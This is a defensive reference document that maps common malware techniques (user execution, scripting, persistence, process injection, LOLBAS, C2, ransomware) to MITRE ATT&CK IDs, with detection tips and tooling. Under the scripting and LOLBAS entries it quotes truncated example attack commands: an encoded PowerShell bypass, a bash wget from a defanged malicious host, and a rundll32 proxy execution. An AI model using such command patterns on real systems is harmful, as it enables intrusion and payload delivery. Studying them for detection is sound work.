# Malware TTPs Mapping (MITRE ATT\&CK)

This document maps common malware behaviors and techniques to MITRE ATT\&CK TTPs and includes tools, detection tips, and response guidance.

---

## ðŸ” Initial Access

### T1204 â€“ **User Execution**

* Users run malware disguised as PDFs, installers, games, etc.
* **Delivery Methods:** Email, drive-by downloads, USBs
* **Detection:** Monitor file execution in temp/download folders
* **Tooling:** Email gateway logs, AV/EDR alerts

### T1566.001 â€“ **Spearphishing Attachment**

* Malware embedded in Office docs/macros
* **Detection:** Monitor `.docm`, `.xlsm`, macro execution via Office telemetry
* **Tools:** Outlook message header analysis, VirusTotal, YARA

---

## ðŸ’£ Execution

### T1059 â€“ **Command and Scripting Interpreter**

* Common for malware payloads via PowerShell, cmd, bash
* **Examples:**

  * `powershell -exec bypass -enc ...`
  * `bash -c "wget http://malicious[.]xyz/..."`
* **Detection:** Look for obfuscated scripts, encoded commands
* **Tools:** Sysmon, Splunk, Sigma rules

### T1106 â€“ **Native API**

* Malware uses Windows API to perform malicious actions (e.g., `CreateRemoteThread`, `VirtualAlloc`)
* **Detection:** Monitor unusual process injection

---

## ðŸ” Persistence

### T1547 â€“ **Boot or Logon Autostart Execution**

* Malware ensures reboots wonâ€™t stop it
* **Methods:** Registry run keys, Startup folder, Scheduled Tasks
* **Detection:** Compare startup entries to baselines

---

## ðŸ•µï¸â€â™‚ï¸ Privilege Escalation

### T1055 â€“ **Process Injection**

* Malware injects into legitimate processes (e.g., `explorer.exe`, `svchost.exe`)
* **Detection:** Look for unusual parent-child process pairs, memory allocation APIs
* **Tools:** Volatility, CrowdStrike, EDR logs

### T1068 â€“ **Exploitation for Privilege Escalation**

* Exploits unpatched vulnerabilities (e.g., CVE-2021-40444)

---

## ðŸŽ›ï¸ Defense Evasion

### T1027 â€“ **Obfuscated Files or Information**

* Encoded PowerShell scripts, XORed payloads, encrypted droppers
* **Detection:** Look for high entropy files or base64 blobs

### T1218 â€“ **Signed Binary Proxy Execution (LOLBAS)**

* Uses trusted binaries like `rundll32.exe`, `regsvr32.exe` to execute malicious code
* **Examples:**

  * `rundll32.exe shell32.dll,Control_RunDLL ...`

---

## ðŸ“¡ Command and Control (C2)

### T1071.001 â€“ **Application Layer Protocol: Web Traffic**

* C2 via HTTP(S) to evade detection
* **Detection:** Beaconing patterns, unusual domains/IPs
* **Tools:** Zeek, Suricata, Firewalls, DNS logs

### T1095 â€“ **Non-Application Layer Protocol**

* Custom C2 channels (e.g., ICMP, TCP raw sockets)

---

## ðŸŽ¯ Impact

### T1486 â€“ **Data Encrypted for Impact (Ransomware)**

* Encrypts data using AES/RSA and drops ransom note
* **Detection:** Sudden spike in file rename/create events
* **Tools:** File Integrity Monitoring, backups, anti-ransomware tools

---

## ðŸ§  Threat Hunting Tips

* ðŸ” Look for unusual child processes (e.g., Word spawning cmd.exe)
* âš ï¸ Baseline scheduled tasks, services, registry keys
* ðŸ“¦ Monitor outbound connections to unknown IPs/domains
* ðŸ§ª Validate hashes and file signatures

---

## ðŸ›¡ Recommended Tools

* **Volatility / Redline** â€“ Memory analysis
* **Sysmon** â€“ Deep Windows telemetry
* **Wireshark / tshark** â€“ Packet capture and inspection
* **MITRE ATT\&CK Navigator** â€“ Visual mapping of TTPs

---

## ðŸ“š References

* MITRE ATT\&CK: [https://attack.mitre.org/](https://attack.mitre.org/)
* LOLBAS Project: [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
* Sigma Rules: [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
* YARA Rules: [https://virustotal.github.io/yara/](https://virustotal.github.io/yara/)

---

> **Pro Tip**: Cross-reference this TTP map with your EDR alerts and IOC feeds for faster triage during malware outbreaks.
